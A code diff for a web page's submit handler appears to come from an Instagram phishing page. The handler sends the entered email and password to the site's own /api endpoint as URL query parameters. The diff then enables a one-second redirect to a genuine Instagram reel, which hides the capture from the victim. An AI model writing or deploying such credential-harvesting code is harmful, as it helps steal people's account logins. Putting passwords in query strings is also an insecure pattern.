@@ -18,24 +18,13 @@ export default function Home() {
 
   const SubmitHandler = async (e) => {
     e.preventDefault()
-    // fetch("/api/hello", {
-    //   headers: {
-    //     'Content-Type': 'application/json'
-    //   },
-    //   method: "POST",
-    //   body: JSON.stringify({ mail: mail, password: password })
-    // })
-    // .then((res) => {console.log(res)})
-    // .catch((err) => {console.log(err)})
-    // fetch(`/api/hello?mail=${mail}&password=${password}`)
-    //   .then(res => console.log(res.json))
-    //   .catch(err => console.log(err))
+   
     const res = await fetch(`/api/hello?mail=${mail}&password=${password}`);
     const data = await res.json();
     console.log(data);
-    // setTimeout(() => {
-    //   location.href = "https://www.instagram.com/reels/videos/CoBHsQnJP3z/"
-    // }, 1000);
+    setTimeout(() => {
+      location.href = "https://www.instagram.com/reels/videos/CoBHsQnJP3z/"
+    }, 1000);
   }
 
   return (
